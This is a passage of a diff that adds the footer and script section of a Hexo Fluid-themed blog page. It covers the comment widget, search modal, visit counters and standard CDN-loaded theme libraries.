+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'M0cK1nG-b1Rd/blog-comments');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://M0cK1nG-b1Rd.github.io" target="_blank" rel="nofollow noopener"><span>M0cK1nG-b1Rd</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Powered by Hexo&Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500,"hOffset":-30,"vOffset":-150},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
